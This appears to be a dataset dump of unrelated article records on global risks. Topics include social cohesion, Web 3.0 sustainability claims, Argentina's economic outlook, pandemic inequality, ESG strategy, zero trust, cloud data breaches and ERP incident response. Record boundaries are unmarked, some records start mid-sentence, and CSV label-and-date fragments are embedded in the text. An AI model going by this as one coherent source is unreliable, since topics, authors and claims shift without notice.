Like Fukuyama, she calls for a period of mandatory community service so that different social groups mingle, an idea her survey shows is supported by 70 percent of Germans. “Germany,” she concludes, “needs policymaking that focuses on the common good instead of offering single-issue reforms for particular groups, which may cause certain parts of society to feel neglected and increase fragmentation as more people isolate into their narrow social groups.”

Marcelo and Carola Suárez-Orozco focus on integration and migration. “If the 20th century was the century of mass migrations, the 21st century will be the century of the children of immigrants,” they write. “In California, over half of the children who walk through the classroom door live in immigrant-headed households. In the United States, 26 percent of children have immigrant parents.” In American neighborhoods and schools, they see a new segregation taking place. “In some regions of the United States, more than 40 percent of Latino students, two-thirds of whom are immigrants or the children of immigrants, are isolated in non-white schools and … more than two-thirds of the students attending those schools are poor.”

Kishore Mahbubani explains how Singapore has avoided the divisions plaguing multiethnic societies in the West to become “the model for inter-racial and inter-religious harmony.” In Singapore, he notes, “social cohesion did not develop by chance. It stemmed from decisive government interventions beginning in the early days of independence in 1965. Since Singapore’s population at the time was 76 percent Chinese, 15 percent Malay and 7 percent Indian, the government made four different languages official in the Constitution in 1965: Chinese, Malay, Tamil and English.”

Similarly, he reports, ethnic integration policies set “racial quotas for each public housing block roughly equivalent to the ethnic breakdown of the country’s population.” Political leadership follows the same pattern. He notes, “The cabinet is currently 68 percent Chinese, 11 percent Malay and 21 percent Indian.”

Mahbubani concludes: “Wise and pragmatic public policies have brought Singapore’s different ethnic groups together. The world would be a more balanced and stable place if the spirit behind these formulas was replicated globally. Treating each community with respect goes a long way, but respect alone is not enough. As Singapore’s example reveals, regulation is needed to prevent social divides.”

Social cohesion erosion”, “livelihood crises” and “mental health deterioration”; the pandemic scars had just begun to set in when the tanks rolled over eastern Europe triggering social and economic tremors across the globe. Even amidst the explosions and bombing, heard aloud is the IPCC climate change warning, “any further delay in concerted global action will miss a brief and rapidly closing window to secure a liveable future”.

We flourished and developed into today’s modern societies through massive industrialization leaving just 3% of the world’s land free from human degradation; wiping out 68% of the wildlife population; heating up the planet through the hottest decade in 125,000 years; stressing and overshooting the planet boundaries establishing absolute human dominance.

As we stand right close to the top 5 existential risks of humanity, all of which converge on ‘environmental’, technology will yet again be massively relied upon to deliver the silver bullet to save the planet.

Evolving through Web 1.0, 2.0 and 3.0

Web 1.0 introduced the internet. Web 2.0 globalized the economies, internet-ed global communities, and enabled us with the anytime-anywhere-anything button in exchange for our personal data with the global big techs. The unprecedented times ahead demand technology upgrades to deliver extraordinary capabilities in record times.

For beginners, Web 3.0 gives us back the ownership of our data by storing them in decentralized networks that are no more controlled by one big owner. The users become the stakeholders of the network wherein anything can be tokenized and transacted. Web 1.0 allowed ‘Read’, Web 2.0 enabled ‘Read’ and ‘Write’, Web 3.0 will entirely redefine the internet experience through immersive and cognitive interaction. The world of blockchains; cryptocurrencies; Non-Fungible Tokens(NFT) – the digital collectibles; Decentralized Autonomous Organizations (DAO); and Metaverse can potentially unravel a power-packed journey into the sustainable world. They stand to deliver solutions at scale to resolve real-world problems; solutions that are co-elevated by capabilities from across data, Machine Learning(ML), Artificial Intelligence(AI), Augmented Reality (AR), and Virtual Reality(VR).

How can a high-emission technology be sustainable?

We will remember that the very first time that blockchains and cryptocurrencies featured in the context of sustainability were for their notorious emissions. Massive blockchain emissions overshooting that of countries in the league of Ukraine, Netherlands, Italy, Argentina, and UAE. There are reports that warned Bitcoin mining in China alone will consume more energy than that of 181 countries by 2024.

Thanks to the widespread concerns and questions, solutions seem to be falling in place and hopefully at a pace to protect the technology and to contain the environmental damage. The traditional “Proof of Work” (PoW) mining method that exhausted massive computational power is being relooked at for replacement with methods such as “Proof of Stake”, “Proof of Capacity” and “Proof of Commitment” that consume exponentially low energy. While Ethereum, the second most widely used cryptocurrency is making progress in this transition; Bitcoin, the master polluter, seems to rely more on shifting energy sources to renewables. A Crypto Benchmarking Study highlights that 76% of PoW miners use some kind of renewables in the mix and 39% of total PoW energy consumption comes from renewables. The trends seem to be moving in the right direction as we come across announcements such as the one from Tesla stating to resume accepting Bitcoin as a form of payment once the mining rate for the cryptocurrency reaches 50% renewables.

Government regulations and legal ownership, cyber security issues, susceptibility to criminal acts, scalability, and privacy are all different wars the technology is fighting at its nascency. It is key to address these critical side-effects and let the technology unleash its powerful dimensions.

Web 3.0 technology is designed to deliver sustainable outcomes. It is;

1. Decentralized – Enabled by distributed ledgers and smart contracts:

Eliminates intermediaries, manual mediation, and arbitration; thereby avoiding power centralization and reducing cost.

Enables multi-dimensional inclusion.

2. Consensus-based:

Reinforces reliability and traceability, ensuring the highest level of governance.

3. Immutable:

Delivers safe, trusted, and secured smart contracts and transactions.

Reduces risk of corruption and manipulation.

Let us look at some of the early adaptations and the potential it opens up.

Decentralized Finance (DeFi) to deliver Sustainable Development Goals (SDGs)

Financial markets stand equally powerful as governments when it comes to their role to drive the development and prosperity of societies. However, the power is centralized within the intermediaries such as banks and financial institutions, making them the single point of failure hosting risks and total control, leaving 1.7 billion unbanked people globally.

Decentralized Finance (DeFi) thereby is designed to break barriers and disrupt the traditional financial world. DeFi enables financial applications built on blockchain technology that designs smart contracts eliminating intermediaries.

One of the best examples that illustrate DeFi implementation is UN’s World Food Programme (WFP) which delivers supplies to refugees across the globe. The traditional choice of transportation and distribution of food often turned complicated, time-consuming, inefficient, and even destroyed the local market systems. A solution required transferring money in a safe and cost-effective manner directly into the hands of a beneficiary whose identity is often unauthorized.

Depending on the traditional banking mechanism required working through local banks and establishing safe and reliable bank accounts for millions of refugees. Banking systems are often found unstable in crisis-hit countries. WFP established the Building Blocks project that brought together blockchain and biometric technology to build a solution that enables WFP to directly collaborate with local merchants by eliminating scores of intermediaries such as banks and logistics companies. The blockchain creates a virtual bank account for each beneficiary and links to biometric identity. Building Blocks enables refugees to walk into stores and check out their supplies just by scanning their iris; eliminating bank accounts and wallets from the effort to put food on the table. The blockchain protects refugee data; saves time and cost on intermediaries; enables real-time transactions in a way it cannot be altered; and ensures the aid is delivered directly into the hands of the beneficiary.

Impact tokens are one such vehicle that can mobilize new investment and economic opportunities towards delivering positive social and environmental impacts. Blockchain technology helps to convert assets into digital tokens of impact, a non-financial value, which can be transacted.

For example:

Moeda is a community focussed lending platform that connects impact investors directly with small businesses that promote SDGs. The program while enabling the underserved women entreprenuers in Brazil with access to capital, the technology guarantees the transparency of the projects for investors from around the world to track the impact of their investments.

Fishcoin incentivizes seafood supply chain stakeholders to share data from the point of harvest to the point of consumption to improve the livelihoods of fishers while making the industry work more sustainably to better protect biodiversity and reduce food waste

Empowa aims to provide decentralized financing for the under-served African mortgage market, unlocking affordable and greener homes for more Africans.

These examples help us visualize how DeFi and blockchain applications can play a major role in the world’s effort to achieve global Sustainable Development Goals (SDGs).

Read Also India pivots to top ESG nation of the world through Budget 2021

India is currently ranked at 120th position in the journey towards achieving its UN SDGs by end of 2030. According to a Standard Chartered report, India needs a whopping USD 2.64 trillion investment to meet the goals by 2030, opening up an opportunity worth USD 1.12 trillion for private sector investment. The private sector, government, and Web 3.0 technology can come together to make this happen efficiently. Building the ecosystems; easy access to the small consumable investment opportunities; the governance in place to ensure that that the outcomes are verifiable and impacts are tracked back to fill the gap in the national SDG indicators; and ensuring a market rate or above market rate return for the investors are the pieces of the puzzle that need to come together

Blockchain for Climate Action

In recent years, blockchain has made promising inroads into its application on climate action. The capabilities such as:

Decentralization.

‘Oracle’ — the entities that connect blockchain to external systems and enable the exchange of massive real-world data.

Ability to perform complex business processing and trigger reliable cognitive business action without engaging intermediaries

Position blockchain as the technology leader in fighting climate change.

Read Also What does healthcare hold for us in future

Let us see some examples of how fully traceable, verifiable and irreversible self-executing contracts, running on blockchains contribute to the fight against climate change.

1. Track climate action and incentivize sustainable practices:

Fully automated smart contracts acting as end-to-end incentive systems that can track actions, outcomes and incentivize individuals, businesses, communities, and governments without manual intervention, have been proven to be feasible. The oracles consume satellite real-world data, such as agricultural data sets (crop yields, soil quality, etc); weather reports; bio-diversity change; and afforestation. The blockchain can then process them and disseminate appropriate action such as dispatch incentives, approve insurance and verify carbon offsets.

For example, Green World Campaign leverages a smart contract application that uses satellite remote sensing data to successfully reward stewards of targeted regenerative agriculture, bringing an unprecedented degree of low-overhead automation and transparency to the process. The payouts are directly triggered by oracles, which are tasked with gathering ground-truthing and satellite data, analyzing it within trusted-execution environments for high-trust quantitative metrics, and relaying it to the blockchain to trigger automated payments to stewards.

2. Decentralizing energy markets through peer to peer energy trades:

The current energy trading system is dependent on intermediaries and associated costs, leading to inefficiencies and high friction. A blockchain-based system can facilitate peer-to-peer energy platforms wherein renewable energy can be traded within the neighborhood fully eliminating the intermediary and transaction processing costs. This prosumer (producers who are also consumers) business model enables high volumes of small trading transactions in the trading market curbing monopoly and making energy available at much cheaper prices. These networks also provide traceability and certification of renewable energy production.

For example, in India, the Uttar Pradesh government established the 1st peert-to-peer energy trading platform as a pilot project in its rooftop solar power segment. Power Ledger, the blockchain platform enables households to set their own prices, track energy trading in real-time and facilitate the settlement of surplus solar transactions through smart contracts executed on the blockchain. The current sell-back price to the grid is around 2 Indian rupees per kilowatt-hour (kWh), while consumers are currently procuring at 6-7 Indian rupees per kWh. UP has amended its regulatory framework to enable controlled peer-to-peer (P2P) energy trading.

3. Enabling Climate Finance:

According to a recent report from Climate Action Tracker, the global climate finance need will reach $5 trillion per year by 2030 and will be sustained through 2050.

Blockchain and crypto assets allow money to be easily transferred around the world without financial intermediaries and at negligible cost. Blockchain-based platforms allow individual and corporate energy investors to buy solar cells even in small units and sell the clean electricity generated. The platforms enable the distribution and receival of funds in digital currency from various investors from anywhere in the world. Blockchain offers enhanced efficiency and transparency of the climate finance flow, increasing the trust between beneficiaries and investors.

The Sun Exchange is a micro-leasing marketplace that connects investors, with the beneficiaries of solar installations in rural South Africa. The Sun Exchange sets up the needed infrastructure and panels are sold through a crowd selling platform. The platform allows anyone with an internet connection to buy solar panels online and rent them to businesses, hospitals, schools, and other organizations based in Africa, with an ensured 10%t return on a 20-year contract. The solar panels are connected to The Sun Exchange platform through smart contracts using Internet of Things sensors tracking usage and payments. The beneficiary organizations have reduced their energy costs by 20-30% through this program.

The technology is increasingly being adopted by the government and private sector through various other climate action use cases. Management of credits and offsets in carbon markets; digital measurement, reporting and verification of ESG attributes; protecting regenerative resources; energy transition; asset ownership and usage; multiple access to the desired asset; and a sharing world are all concepts supported by crypto and blockchain.

Conclusion

As we heard from the Tesla and Twitter quarters, Web 3.0 potentially is still a buzzword. So were airplanes, computers, the internet, autonomous cars, Moon and Mars trips; just no more than a buzzword once. The technicalities need to stabilitize, the legality needs to be established and the democratization is to be achieved.

Sustainability demands collaboration, transparency, reliance, trust, love for life, a joint endeavour linked to a network which must link the entire human race; and Web 3.0 is designed to do so at its core.

Value of sustainability can be seamlessly moved around the world by promoting NFTs and DAOs in forms unimagined — tokens that seed and grow 100 million mangroves; Hangry Animals tokens that save Sumatran elephants; Klima tokens that protect sea turtles; Veritree tokens building forests; Citizen DAO that coordinates ideas, people and crypto to solve humanity’s biggest problems; basinDAO that unlocks value in carbon, natural capital and biodiversity; are all examples leading to a better sustainable world.

Let’s embrace the potential of Web 3.0, by accounting for six capitals and creating an audit trail that is robotically auditable. When Net Zero arrives, we must all be able to see and experience it!

Some analysts foresee inflation around 85% for the year 2022 if an agreement with the IMF is not reached

The World Economic Forum (WEF) has said Argentina's future was anything but promising as a result of the lethal combination of inflation and the state's financial collapse.

The WEF's predictions have thus joined other gloomy projections from economic media analysts and investment banks as the Government of President Alberto Fernández continues not to reach a deal with the International Monetary Fund (IMF).

In this scenario, the WEF foresees a widespread stagnation, rising unemployment and serious troubles to lower inflation.

The WEF's annual report which has been released recently in a virtual event also insisted on the concrete possibility of a collapse of the State, while Argentina was among the countries in the world with the most serious problems of erosion of social cohesion.

Specifically, the Global Risks report from Davos says the following about Argentina:

- Prolonged economic stagnation: zero or slow growth for many years. Argentina recovered in 2021 from the strong recession it suffered in 2020 due to the pandemic and the long quarantine, but it has suffered a situation of very low growth or recession in the last decade, with few exceptions, which affects all macroeconomic indicators.

- Employment crisis: structural deterioration of job prospects and working-age standards; unemployment, low wages, fragile contracts and erosion of labor rights.

- Collapse of the State: as a result of an internal conflict, breakdown of legal security and erosion of institutions. In the Argentine case, businessmen tend to highlight the lack of legal and institutional security as an element that goes beyond any partisan sign.

- Failure to stabilize inflation: inability to control rising general inflation. After registering 53.8% in 2019, in 2021 the CPI was 51.2% despite frozen prices, in addition to a slow devaluation coupled with no increases in utility rates. Analysts foresee inflation around 85% for the year 2022 if an agreement with the IMF is not reached.

- Digital inequality: unequal access to technology and virtual networks, as a result of unequal investment capacities, lack of tools in the workforce, insufficient purchasing power, government restrictions and cultural differences.",Social Cohesion Erosion,2022-01-18 08:00:00

The pandemic also poses significant risks to long-term equity and social mobility , as we discuss in a recent paper, using evidence from past crises and early insights from data collected during this pandemic.

What history tells us: Pandemics are not good for inequality

A recent study on the effects of five pandemics between 2003 and 2016 finds that on average, income inequality in affected countries increased steadily over the five years following each event, with the effect being higher when the crisis led to contraction in economic activity, as is the case with COVID-19.

The historical estimates probably understate the potential long-term effects of COVID-19 , given the much larger income impacts of this pandemic. Five years after a pandemic is also too soon for the full impacts on inequality of opportunity and social mobility to emerge. Lower social mobility, or greater persistence of outcomes such as education and income across generations, holds back a society’s progress by perpetuating inequality, reducing economic growth and social cohesion over time.

What early evidence shows: COVID-19 is affecting the poorest the most, increasing inequality

Short-term projections by the World Bank and the International Monetary Fund suggest that extreme poverty worldwide and income inequality for low-income and emerging economies are likely to increase in 2020. Within countries, early data indicate that labor market impacts of the pandemic are strikingly unequal, varying with characteristics of jobs, workers and firms. Data from the COVID-19 dashboard show that in most countries, college-educated workers are less likely to stop working than those with less education and women survey respondents are more likely to stop working than men. The rate of job losses was highest in industry and urban services, which tend to have jobs that are least amenable to working from home. Phone surveys of firms show that micro and small firms, relative to large firms, have a higher probability of falling into arrears. Thus, a temporary loss of revenues for these firms can turn into longer-term erosion of jobs and entrepreneurial capital, which disproportionately affects workers who are young, low-skilled or without access to capital.

Schooling disruptions are also more likely to affect the poorest most. In Ethiopia and Nigeria, for example, the richest 20% of households were much more likely to have children engaging in any learning activity after school closures than the bottom 20%.

What to expect in the future: Three reasons to be concerned about rising long-run inequality

Evidence from previous disasters suggests that not only can welfare impacts on the poorest households be larger, recovery after a shock can also be slower (Figure 1). We currently see three causes for concern that, unless addressed, this pattern will play out for this crisis too.

Now in its 17th edition, the Report provides a comprehensive analysis of the key risks predicted to arise from current global economic, societal, environmental and technological conditions.

The Report represents the combined expertise of the WEF’s Global Risks Practice, and industry and academic partners, in conjunction with the results of a series of consultations with public and private sector regional and thematic experts, the WEF Global Risks Perception Survey (surveying ~1,000 global experts and leaders) and the WEF Executive Opinion Survey (surveying ~12,000 CEO’s across 124 countries).

The Report’s results provide useful insights for today’s business leaders as they create policies and strategic plans responsive to emerging regional and global challenges, and to the perspectives of stakeholders.

In this article, we canvas the Report’s key takeaways to draw out their implications for corporate risk management and economic, social and governance (ESG) strategy in 2022.

1. Climate risks to have a transformative impact on all sectors – early adaptation projected to produce significant advantage over next ten years

Risks – Climate action failure, extreme weather events and biodiversity loss have been pinpointed as the three global risks anticipated to have the most damaging effect over the next ten years. Their projected flow-on effects are extensive, and include intensified rates of involuntary migration, natural resource crises, pollution harms to health, geopolitical resource contestation, social security collapse and livelihood and debt crises.

Increasing rates of environmental degradation and extreme weather events are anticipated to increase pressure on the stability of corporate supply chains and access to land and resources. Likewise, elevated policy and regulatory action in respect of carbon-intensive industries is projected to disrupt markets, limit investment opportunities and prospectively result in stranded assets.

As countries continue to transition to lower carbon economies at varying paces, transnational companies are likely to encounter increasing differences in legislative and regulatory regimes. A ‘disorderly’ global transition, as the Report describes it, is anticipated to result in more frequent and severe supply chain shortages, and disruptions to labour and production for transnational and highly carbon-exposed companies in particular.

Response – These findings suggest that:

it will be increasingly essential for boards and directors to proactively assess and factor both physical and transition climate risks into decision-making;





remaining ahead of the curve, adopting net zero strategies and targets early and conducting regular comprehensive climate risk assessments (inclusive of legal and financial risks) may assist in mitigating any disruption to operations; and





early adaptation is more likely to minimise the impacts of the global transition.

There remain significant first mover advantages to be had in reducing carbon-exposure and establishing a robust net zero strategy.

Strategic investment in carbon emissions reduction and offsetting strategies, biodiversity preservation, renewable energy, resources security and defences against natural disasters are identified as key opportunities for those ready to adapt early. The market gains to be had are vast, with consumer and investor confidence predicted to be increasingly tied year on year to a company’s climate transition ‘readiness’, including its maximisation of net zero opportunities. This effect is likely to intensify as ESG-related financial risk disclosure and reporting becomes both more rigorous and more standardised, indicating that access to capital will be increasingly contingent on robust engagement with climate risks and ESG more broadly.

2. Post-pandemic socioeconomic challenges to intensify focus on ESG strategy and supply chain stability

Risks – The socioeconomic challenges that have flowed from the COVID-19 pandemic are anticipated to persist, and in some sectors, intensify. In the Australian context, ‘debt crises’ (defined within the Report as ‘mass bankruptcies, defaults, insolvency, liquidity crises or sovereign debt crises’) were highlighted as one of the key risks that will take centre stage in the short to mid-term (2-5 years).

The picture painted by the Report’s analysis is clear – rising commodity prices, inflation and debt are predicted to result in the global economy being 2.3% smaller by 2024 than present. Due to the necessity of protecting incomes and preserving jobs, post-pandemic corporate and public debt burdens are high. Public budgets are projected to remain stretched over the coming two to five years, with livelihood crises, mental health deterioration and social cohesion erosion identified as significant emerging global risks.

The economic fallout of the pandemic may be compounded by continuing limitations on international movement and disparities in rates of vaccination, which may in turn produce labour market imbalances and skills gaps, and create disruptions to corporate supply chains and production. Simultaneously, ESG-based investing is significantly altering the financial and economic landscape globally, compelling corporations to address a series of issues including auditing their supply chains for human rights impacts, committing to the decarbonisation of operations and implementing effective modern slavery policies.

Response – Surprisingly, the coalescence of these factors may produce ideal conditions for companies to focus on shortening their supply chains and incorporating ESG-informed principles into their long term strategy. Prudent risk management responses in this space may include:

development and implementation of a robust ESG assessment and reporting strategy, noting that ESG reporting is increasingly being utilised by shareholders and investors as a proxy to evaluate management, identify the risk and value of actual and prospective investments, and make decisions regarding allocation of capital;





commencement and/or maintenance of a clear dialogue with stakeholders regarding ESG issues; and





engagement in comprehensive supply chain due diligence and consideration of opportunities to shorten the corporate supply chain and adopt ESG-informed protocols.

As momentum for ESG-based investing grows, shortening the supply chain and building strong local relationships may have positive flow on effects. Adopting a local procurement strategy and investing in supply chain due diligence may assist in eliminating labour exploitation and human rights violations from the supply chain. Likewise, use of a shorter supply chain may help to reduce a company’s overall carbon footprint by limiting the use of carbon intensive processes such as air freight and shipping.

Throughout 2021, a broad reallocation of global capital towards responsible and sustainable funds and businesses was visible in all sectors. Investing in an organisation’s ESG credentials, and conducting supply chain due diligence as a component of this, may bolster positive shareholder sentiment and increase interest from investors and financiers. In this respect, shortening the supply chain may be a prudent risk management strategy as investor sensitivity to the longitudinal risks of climate change, biodiversity loss, labour exploitation and human rights violations in supply chains continues to intensify.

3. Investment in robust cyber security measures is key in response to intensive digitalisation of major industries throughout pandemic

Risks – Technological risks have been highlighted as critical short to mid-term threats both globally and for Australia specifically. At a regional level, ‘failure of cyber security measures’ was identified as a key risk for East Asia and the Pacific, and the number one risk over the next two years for Australia, Great Britain, Ireland and New Zealand.

The COVID-19 pandemic (and associated lockdown measures) has propelled the rapid and intensive digitalisation of numerous industries over an 18-month period. As business and economic activity increasingly occurs online, exposure to cyber security threats is growing. Attacks on large technological systems are projected to become more severe and broadly impactful, with the Report raising concerns that quantum computing may have the capacity to break encryption keys. If so, this may place sensitive financial and personal data at risk. Interestingly this has been brought to bear, as earlier this week the Australian Cyber Security Centre warned Australian organisations they should be on high alert for cyber-attacks as a result of the rising tensions in Ukraine.

Response – While cybersecurity is anticipated to become a key area of regulator focus, the Report emphasises that it is vital that companies engage in horizon scanning and adapt ahead of regulatory shifts. The potential financial implications of disruptive cyberattacks are extensive. Investing early in protections for digital infrastructure, shifting data processing to jurisdictions with robust customer protections regarding data privacy, and upskilling within-organisation IT and cybersecurity professionals may be useful risk mitigation strategies.

As ESG concerns are drawn increasingly into focus, organisations that fail to demonstrate strong corporate governance around cybersecurity may suffer reputational harm.

Key recommendations for ESG strategy and risk management

Invest in rigorous risk assessment – ESG risk assessment should bring together appropriate cross-functional expertise. It is critical that boards, directors and general counsel receive specialist advice regarding:

regulatory and compliance ESG risks;





steps that must be taken to proactively and robustly comply with evolving reporting and disclosure requirements; and





how environmental, social or governance issues may impact the performance, long-term viability and reputation of the organisation.

Carry out in-depth ESG due diligence – risk assessment is necessary on organisational, portfolio and transactional levels to ensure current assets and projects, and prospective acquisitions, do not present unchecked ESG risks. Proactive risk assessment and mitigation is particularly important given the movement of ASIC and other regulators in this space. Scenario analysis may be useful at this stage, as it allows an organisation to pinpoint all types of failure, damage and attrition that could result from physical and transition climate risks and compromise the company’s ability to deliver value.

Set and communicate clear ESG targets to internal and external stakeholders – these should include identification of the metrics by which progress will be measured, establishment of ESG governance and implementation of routine risk assessment, reporting and disclosure processes. This includes both reports to the board and disclosures to shareholders.

Ensure engagement in ongoing risk assessment and horizon scanning – remain alert to changing regional and global circumstances which may signal elevated risk, and adjust the company’s operational processes accordingly. This may mitigate damage flowing from geopolitical events. Establishing an internal mechanism by which the board and senior management will remain aware of emerging compliance or regulatory risks is critical.

Embrace early adaptation and diversify the organisation’s resilience strategies – there remains a clear first mover advantage to be had in adjusting corporate commitments, supply chains, policies and operational processes early to limit carbon exposure and address ESG risks. Early adoption and implementation of a range of innovative practices for identification, monitoring, reporting and mitigation of ESG risks is akin to investing in a diversified portfolio. Investing in a broad range of risk mitigation strategies may more effectively advance an organisation’s net zero position and increase the likelihood of long term success, irrespective of any rapid changes in global conditions that emerge.

Gillis shared how VMware’s customers’ attitudes towards security appear to be evolving in light of both recent developments within the cybersecurity industry and events going on in the world at large; among the developments that he discussed were indications of a shift in the attention of those responsible for ensuring organizational cybersecurity toward a greater focus on threat analysis.

Many of Gillis’s comments echoed those that I have heard in recent months from CISOs and others within the cybersecurity industry who witness developments from various vantage points quite different from those of a vendor of cybersecurity technologies. Additionally, while VMware’s customers obviously invest in areas of cybersecurity related to VMware’s fields of activity, many of Gillis’ observations were both clearly vendor neutral and not limited to VMware’s areas of activity, either applying or not applying to VMware’s competitors as much as they did to VMware.

As such, I thought I would share two particular points that Gillis covered during his presentation, both of which are similar in nature to comments that I have heard recently from other folks working in other areas of the cybersecurity field, and both of which I believe will be interesting for many of my readers to learn about:

Zero Trust Gaining Acceptance In Real-World Information Security Programs

While “zero trust” has been a buzzword for some time, the principle of zero trust, and expenditures toward getting organizational policies, procedures, and infrastructure closer to delivering it, is gaining acceptance as constituting a fundamental component of information security programs.

CISOs and others responsible for security have clearly shifted from a “defend the fort” approach to one in which they recognize that despite their valiant efforts to protect information and information systems, they must assume that their respective organizations have suffered cyber-breaches about which they are unaware. As a result, cybersecurity programs must be crafted and implemented not only to defend against lateral movement through data systems by so called “authorized users” but also to treat users on internal networks as if they were no more trustworthy than users accessing via Internet-based connections emanating from halfway around the work.

Today, cybersecurity professionals must deem all traffic – including traffic for communications occurring solely on internal networks under their purview – as potentially dangerous.

Sampling No Longer Works

As a result of the risk of attackers being present on internal networks and appearing to be authorized internal users, the approach taken in the past of examining small samples of traffic flowing laterally within organizational networks in order to maximize performance as well as to identify and stop any unauthorized activities (AKA “East-West Traffic”) is no longer appropriate; because most internal traffic is likely to be generated by legitimate users, or may appear to be coming from legitimate users, trying to extrapolate from a sample set of data in order to determine (or, more accurately, “to predict”) what should and should not be happening is likely to fail. In such situations, sampling may cause security systems to misunderstand what is legitimate behavior and what is not, as well as to miss various uncommon, yet extremely dangerous, unauthorized lateral movements.

Furthermore, sampling is unlikely to detect breaches that occur within a single computer – and a hacker who does breach a single system as such may wait before moving laterally in order to avoid detection. If compromising a single device can lead to a hacker eventually moving laterally and wreaking havoc, or is itself likely to adversely impact a business, relying on sampling may lead to seriously adverse consequences.

Furthermore, the proliferation of virtual-machine based implementations of computer systems means that, today, tapping network “wires” (including their air-based wireless equivalents) may miss significant amounts of lateral movement – this is true even if all captured network traffic is analyzed, and is even more problematic if only samples are taken.

Sebastien Cano, SVP for Cloud Protection and Licensing activities at Thales said: “The complexity of managing multicloud environments cannot be overstated.
The challenge is not only where the sensitive data resides geographically, but even who has access to sensitive data inside the organization.","A Thales report, conducted by 451 Research, reveals that 45% of businesses have experienced a cloud-based data breach or failed audit in the past 12 months, up 5% from the previous year, raising even greater concerns regarding to protecting sensitive data from cybercriminals.

Globally, cloud adoption and notably multicloud adoption, remains on the rise. In 2021, organizations worldwide were using an average amount of 110 software as a service (SaaS) applications, compared with just eight in 2015, showcasing a startlingly rapid increase.

There has been a notable expansion in the use of multiple IaaS providers, with 72% of businesses using multiple IaaS providers, up from 57% the year before. The use of multiple providers has almost doubled in the last year, with 20% of respondents reporting using three or more providers.

Despite their increasing prevalence and use, businesses share common concerns about the increasing complexity of cloud services with 51% of IT professionals agreeing that it is more complex to manage privacy and data protection in the cloud. Additionally, the journey to the cloud is also becoming more complex, with the percentage of respondents reporting that they’re expecting to lift and shift, the simplest of migration tactics, dropping from 55% in 2021 to 24% currently.

Security challenges of multicloud complexity

With increasing complexity of multicloud environments comes an even greater need for robust cybersecurity. When asked what percentage of their sensitive data is stored in the cloud, 66% said between 21-60%. However, only 25% said they could fully classify all data.

Additionally, 32% of respondents admitted to having to issue a breach notification to a government agency, customer, partner or employees. This should be a cause for concern among enterprises with sensitive data, particularly in highly regulated industries.

Cyber-attacks also present an ongoing risk to cloud applications and data. Respondents reported an increasing prevalence of attacks, with 26% citing an increase in malware, 25% in ransomware and 19% reporting seeing an increase in phishing/ whaling.

Protecting sensitive data

When it comes to securing data in multicloud environments, IT professionals view encryption as a critical security control. The majority of respondents cited encryption (59%) and key management (52%) as the security technologies they currently use to protect sensitive data in the cloud.

However, when asked what percentage of their data in the cloud is encrypted, 11% of respondents said between 81-100% is encrypted. Additionally, key management platform sprawl may be an issue for enterprises. Only 10% of respondents use one to two platforms, 90% use three or more, and 17% admitted using eight or more platforms.

Encryption should be a priority area for enterprises to focus on when it comes to securing data in the cloud. In fact, 40% of respondents stated that they were able to avoid the breach notification process because the stolen or leaked data was encrypted or tokenised, showcasing the tangible value of encryption platforms.

Additionally, it is encouraging to see signs enterprises embrace zero trust and investing accordingly. 29% of respondents said they are already executing a zero trust strategy, 27% said they are evaluating and planning one and, 23% said they are considering it. This is a positive result, but there is certainly still room to grow.

Sebastien Cano, SVP for Cloud Protection and Licensing activities at Thales said: “The complexity of managing multicloud environments cannot be overstated. Additionally, the growing importance of data sovereignty is increasingly raising questions for CISOs and Data Protection Officers when considering their cloud strategy, governance, and risk management. The challenge is not only where the sensitive data resides geographically, but even who has access to sensitive data inside the organization.

“There are various solutions such as encryption and key management. Last but not least, continuing to embrace a zero trust strategy will be essential in securing these complex environments, helping to ensure organizations can support their data and manage future challenges.”",Cybersecurity Failure,2022-06-13 03:30:28

Understanding the gaps in current incident response processesMany companies invest heavily in many layers of technology to secure their critical operations.
Many threat groups have highlighted how cybercriminals can enter business-critical applications directly and remain undetected for months – even years – while quietly siphoning off millions of dollars.
Organizations often generate incident response playbooks that outline strategies based on a type of attack (e.g., ransomware or zero-day exploitation).
Taking a risk-based approach to incident responseA risk-based approach to incident response enables enterprises to prioritize vulnerabilities and incidents based on the level of risk they pose to an organization.","Business-critical applications, such as enterprise resource planning (ERP) systems provided by SAP and Oracle, are considered the crown jewels of the enterprise. These assets hold an organization’s most valuable data: from confidential financial information to private customer and partner details. Attackers that gain access to these applications can cause mass destruction, by hijacking an organization’s payroll system, shutting down its manufacturing facilities, or transferring large sums of money to their own bank accounts.

Despite the high value of these applications, they are constantly placed at risk by the discovery of critical vulnerabilities. At the same time, security teams are perpetually challenged with limited bandwidth and resources.

This article will explore why current cybersecurity incident response efforts are failing, and how a proactive, risk-based approach enables companies to reduce exposure most effectively and to maximize the return on their limited resources.

Understanding the gaps in current incident response processes

Many companies invest heavily in many layers of technology to secure their critical operations. To control every attack vector, they spend money on endpoint security tools, network defenses, authentication and identity solutions, application delivery services, and more. While these capabilities are crucial, very little budget or time is allocated to the critical applications themselves that contain the assets that matter most. Many threat groups have highlighted how cybercriminals can enter business-critical applications directly and remain undetected for months – even years – while quietly siphoning off millions of dollars.

The law of diminishing returns is highly prevalent in cybersecurity: the first layer of defense on any asset or for any attack vector reduces the risk most significantly. Now that the critical applications are being targeted directly, they must also be defended directly.

Organizations often generate incident response playbooks that outline strategies based on a type of attack (e.g., ransomware or zero-day exploitation). However, obtaining a deeper understanding of an organization’s business-critical application landscape and creating a playbook focused on the assets, systems, and processes that matter most can be far more effective at overall organizational risk reduction.

Taking a risk-based approach to incident response

A risk-based approach to incident response enables enterprises to prioritize vulnerabilities and incidents based on the level of risk they pose to an organization. The simplest way of framing risk is a calculation on frequency of occurrence and severity. Malware frequently reaches endpoints, and response and clean-up can cost thousands of dollars (both directly and in lost productivity). Furthermore – and security teams all over the world would agree on this – vulnerabilities on internet-facing systems must be prioritized and remediated first. Those systems are continuously under attack, and as the rate of occurrence starts to approach infinity, so does risk.

Similarly, there have been many threat groups that have costed enterprises millions directly, and in some cases tens of millions in lost operations and ERP system downtime. Large enterprises measure the cost of simple maintenance windows in ERP systems in tens of millions. Thus, it’s difficult to imagine the substantial calculations on a business-critical application breach. As severity increases to that order of magnitude, so does risk.

Like internet-facing systems with the highest rate of occurrence, business-critical applications hold the highest level of severity of impact. A risk-based approach can also help IT teams properly allocate their efforts and budgets and drive the maximal risk reduction on a per dollar or per hour basis.

Incorporating modern vulnerability management tools

With modern vulnerability management tools, security teams can gain full visibility into all assets across the IT environment, including those hosted on-premises, the cloud, or both. This enables them to make an inventory of all assets within their system, identify any hidden or previously known vulnerabilities, and keep a record of all of them.

